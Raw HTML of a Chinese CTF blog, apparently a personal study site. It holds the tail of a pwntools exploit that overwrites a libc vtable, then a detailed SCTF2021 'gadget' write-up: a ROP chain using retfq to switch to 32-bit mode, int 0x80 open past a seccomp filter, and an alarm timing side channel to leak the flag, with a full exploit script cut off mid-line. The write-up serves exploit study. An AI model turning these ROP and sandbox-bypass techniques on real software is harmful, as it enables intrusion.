class="line">    bss_addr=dist_addr-<span class="number">0x4720</span></span><br><span class="line">    dock_addr=elf_base+<span class="number">0x16A5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2272</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">    <span class="comment">#io=libc_base+0x1ec8a0+0x38</span></span><br><span class="line">    io=libc_base+libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+<span class="number">0x28</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(io)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>((io-dist_addr)/<span class="number">8</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(dock_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many nodes?\n&gt;&gt; &#x27;,&#x27;2&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many edges?\n&gt;&gt; &#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(1))</span></span><br><span class="line">    <span class="comment"># sh.sendline(&#x27;-2217&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(bss_addr+0x100+0xd8+0x38))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;you want to start from which node?\n&gt;&gt; &#x27;,str(0x10))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,str(-2272))</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>调试程序越来越熟练了，通过调试printf函数的执行过程也直观了解了虚表的作用，以后能任意写除了got表和exit，还能改写虚表拿shell了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/sctf2021-gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/20/sctf2021-gadget/" class="post-title-link" itemprop="url">sctf2021 gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-20 18:32:48 / 修改时间：18:37:19" itemprop="dateCreated datePublished" datetime="2022-01-20T18:32:48+08:00">2022-01-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="sctf2021-gadget"><a href="#sctf2021-gadget" class="headerlink" title="sctf2021 gadget"></a>sctf2021 gadget</h1><p>知识点：64位程序转32位，三十二位使用int80调用open，alarm侧信道攻击</p>
<p>做过的最难的构造rop题目了，但学到了很多东西，用了快两天才复现成功，这道题能搜到的wp就两个，而且只有脚本，没有多少讲解，我是硬着头皮看脚本一步步动态调试才搞明白，所以这篇wp我会写的细一点，一方面有可能对其他人有用（几乎不可能），一方面加深我的理解。</p>
<h2 id="64位程序转32位"><a href="#64位程序转32位" class="headerlink" title="64位程序转32位"></a>64位程序转32位</h2><p>程序运行起来时，专门有一个寄存器cs来决定到底是以64位运行还是以32位运行，当cs为0x33时，程序以64位运行，当cs是0x23时程序以32位运行，这个寄存器并不是不能更改的，专门有个指令retfq用来更改cs，最关键的是retfq还有跳转功能，那就代表组成攻击链。</p>
<p>retfq有三步操作（就结果而言），先设置cs为[rsp+0x8]，然后rsp+0x10,然后跳转到rsp-0x10,这样说可能有点抽象，我们可以用gadget来实操一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)+p32(pop_rax)</span><br></pre></td></tr></table></figure>

<p>然后在这里下断点运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x409d1c &lt;__futexwait+113&gt;    pop    rsp</span><br><span class="line">   0x409d1d &lt;__futexwait+114&gt;    mov    edi, 0x88bf2838</span><br><span class="line">   0x409d22 &lt;__futexwait+119&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line"> ► 0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">    ↓</span><br><span class="line">   0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x40d010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x401002 (_init+2) ◂— ret    </span><br><span class="line">01:0008│     0x40d018 ◂— 0x23 /* &#x27;#&#x27; */</span><br><span class="line">02:0010│     0x40d020 (__dso_handle) ◂— 0x500401001</span><br><span class="line">03:0018│     0x40d028 (__dso_handle+8) ◂— 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">04:0020│     0x40d030 (install_seccomp.filter) ◂— 0x40d0000040d000</span><br><span class="line">05:0028│     0x40d038 (install_seccomp.filter+8) ◂— 0x40117b0040d000</span><br><span class="line">06:0030│     0x40d040 (install_seccomp.filter+16) ◂— 0x4011f300000000</span><br><span class="line">07:0038│     0x40d048 (install_seccomp.filter+24) ◂— 0x401002004011ec</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>这时要执行retfq时的指令区和栈区，执行完后就变成这样了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x401002 &lt;_init+2&gt;    ret    &lt;0x500401001&gt;</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x40d020 (__dso_handle) ◂— 0x500401001</span><br><span class="line">01:0008│     0x40d028 (__dso_handle+8) ◂— 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">02:0010│     0x40d030 (install_seccomp.filter) ◂— 0x40d0000040d000</span><br><span class="line">03:0018│     0x40d038 (install_seccomp.filter+8) ◂— 0x40117b0040d000</span><br><span class="line">04:0020│     0x40d040 (install_seccomp.filter+16) ◂— 0x4011f300000000</span><br><span class="line">05:0028│     0x40d048 (install_seccomp.filter+24) ◂— 0x401002004011ec</span><br><span class="line">06:0030│     0x40d050 (install_seccomp.filter+32) ◂— 0x40100100000033 /* &#x27;3&#x27; */</span><br><span class="line">07:0038│     0x40d058 (install_seccomp.filter+40) ◂— 0x0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]─────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>此时rsp已经加10，要执行的指令也是此时的rsp-0x10,即我们构造的ret,rsp也是我们构造的gadget的指令，这样攻击链就连上了（跳转功能）。</p>
<h2 id="三十二位使用int80调用open"><a href="#三十二位使用int80调用open" class="headerlink" title="三十二位使用int80调用open"></a>三十二位使用int80调用open</h2><p>64位系统调用open和32位系统调用open函数的寄存器布置并不相同，网上也没什么资料，搜了好久然后问了ayoung佬才搞懂。在64位系统调用时要布置rax,rdi,rsi,rbx四个参数，rax是系统调用号，后面三个是参数，在32位系统调用时是布置ecx,eax,ebx,edx,四个参数的作用如下图如下图，其中eax,ebx必须非常严谨，ecs和edx布不布置都行，但ecx为0会提高成功率（奇怪的知识），所以最好还是布置ecx。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119222532362.png" alt="image-20220119222532362"></p>
<p>在32位程序中系统调用并不是syscall（而且并不存在），而是int80指令，选择gadget的时候最好选择int80;ret（如果后面还有rop要执行的话）,</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 80;ret</span><br></pre></td></tr></table></figure>

<h2 id="alarm侧信道攻击"><a href="#alarm侧信道攻击" class="headerlink" title="alarm侧信道攻击"></a>alarm侧信道攻击</h2><p>alarm函数是程序的一个计时函数，比如程序刚开始调用alarm(10)，那这个函数从这个时间点开始只能再执行十秒钟</p>
<p>利用思路：可以把flag的每个字符mov给rdi后调用alarm函数，从alarm函数开始执行的时候计时，然后检测程序的结束时间，结束时间减去开始时间就是rdi的值即flag的每个字符的值。</p>
<h4 id="重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop"><a href="#重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop" class="headerlink" title="重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop"></a>重点：当执行完alarm函数后得让程序陷入死循环，不然执行完alarm函数就直接退出程序了，不能达到我们想要的目的，比如这个rop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(push_rsi_ret)</span><br></pre></td></tr></table></figure>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>checksec分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/get-shell/sctf2021/gadget/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>沙盒分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ seccomp-tools dump ./gadget</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>只允许调用fstat(32位下的open函数),read函数和alarm函数，从这里就可以看出做题思路了，先64位转三十二位调用open函数读flag，然后再转成64位调用read函数把flag写到程序里，然后alarm侧信道爆破</p>
<p>ida反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  alarm_sys(<span class="number">48LL</span>, argv, envp);</span><br><span class="line">  install_seccomp(<span class="number">48LL</span>, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">  read_sys(v9);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)&amp;locret_401002;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_sys</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sys_read(<span class="number">0</span>, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序非常简单没有canary还有溢出，那就直接溢出构造rop完成攻击思路，注意rop非常长所以得进行栈迁移才行。</p>
<p>第一步调用read函数把rop写到bss段然后栈迁移到这里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>

<p>第二步retfq后调用open函数读flag文件，然后再retfq后调用read函数把flag写到bss段，然后再调用read函数进栈迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">   payload+=p64(bss_base+<span class="number">1</span>+num+)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num+)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num+)</span><br><span class="line">paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>第三步把alarm函数的rop写入bss段然后计时（注意不能在第二步就把alarm函数的rop就写入栈中，这样做的话我们就不能知道alarm函数到底是什么时候调用的，因为前面执行了好多代码了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">   payload+=p64(push_rsi_ret)</span><br><span class="line">   sh.send(payload)</span><br><span class="line">   start=time.time()</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       sh.recv()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       end=time.time()</span><br><span class="line">       asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">       <span class="keyword">global</span> flag</span><br><span class="line">       flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">       <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>

<p>完整脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    gdb.attach(sh,<span class="string">&quot;b *0x0000000000409d1c&quot;</span>)</span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span 